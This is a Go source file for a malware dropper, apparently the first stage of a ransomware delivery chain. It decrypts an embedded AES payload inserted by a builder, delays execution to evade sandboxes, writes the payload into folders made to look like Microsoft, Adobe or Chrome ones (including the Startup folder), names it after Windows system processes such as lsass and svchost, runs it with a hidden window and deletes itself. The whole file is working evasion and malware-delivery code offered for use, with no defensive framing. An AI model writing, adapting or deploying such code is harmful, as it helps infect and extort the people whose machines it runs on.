package main

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"os"
	"os/exec"
	"path/filepath"
	"syscall"
	"time"
)

// Stage 1: Dropper (this compiles cleanly without ransomware signatures)
// It downloads and decrypts the real payload at runtime

// Encrypted payload will be embedded here by builder
var encryptedPayload = "{{PAYLOAD}}"
var payloadKey = "{{KEY}}"

func main() {
	// Anti-sandbox delay
	time.Sleep(65 * time.Second)

	// Decrypt and execute real payload
	payload := decryptPayload()
	if payload == nil {
		return
	}

	// Write payload to a legitimate-looking location
	// Option 1: AppData\Local (less monitored than Temp)
	appData := os.Getenv("LOCALAPPDATA")

	// Create fake legitimate folder structure
	legitimateFolders := []string{
		filepath.Join(appData, "Microsoft", "Windows", "WinX"),
		filepath.Join(appData, "Microsoft", "Edge", "User Data"),
		filepath.Join(appData, "Adobe", "Acrobat", "DC"),
		filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup"),
		filepath.Join(appData, "Google", "Chrome", "User Data", "SwReporter"),
	}

	// Pick random legitimate folder
	dropDir := legitimateFolders[time.Now().Unix()%int64(len(legitimateFolders))]
	os.MkdirAll(dropDir, 0755)

	randomName := generateRandomName() + ".exe"
	tempPath := filepath.Join(dropDir, randomName)

	// Write with random delays to avoid behavioral detection
	time.Sleep(time.Duration(2+time.Now().Unix()%3) * time.Second)

	if err := os.WriteFile(tempPath, payload, 0755); err != nil {
		return
	}

	// Execute payload in background
	time.Sleep(time.Duration(1+time.Now().Unix()%2) * time.Second)

	cmd := exec.Command(tempPath)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow:    true,
		CreationFlags: 0x08000000, // CREATE_NO_WINDOW
	}
	cmd.Start()

	// Wait a bit then cleanup dropper
	time.Sleep(5 * time.Second)
	os.Remove(os.Args[0]) // Self-delete
}

func decryptPayload() []byte {
	// Decode base64 payload
	encrypted, err := base64.StdEncoding.DecodeString(encryptedPayload)
	if err != nil {
		return nil
	}

	// Decode key
	key, err := base64.StdEncoding.DecodeString(payloadKey)
	if err != nil {
		return nil
	}

	// AES decrypt
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil
	}

	if len(encrypted) < aes.BlockSize {
		return nil
	}

	iv := encrypted[:aes.BlockSize]
	encrypted = encrypted[aes.BlockSize:]

	stream := cipher.NewCFBDecrypter(block, iv)
	stream.XORKeyStream(encrypted, encrypted)

	return encrypted
}

func generateRandomName() string {
	// Generate random name that looks legitimate
	names := []string{
		"svchost", "rundll32", "taskhost", "conhost",
		"dwm", "explorer", "winlogon", "lsass",
		"services", "csrss", "smss", "wininit",
	}

	idx := time.Now().Unix() % int64(len(names))
	suffix := time.Now().Unix() % 9999

	return names[idx] + string(rune(48+suffix%10)) + string(rune(48+(suffix/10)%10))
}
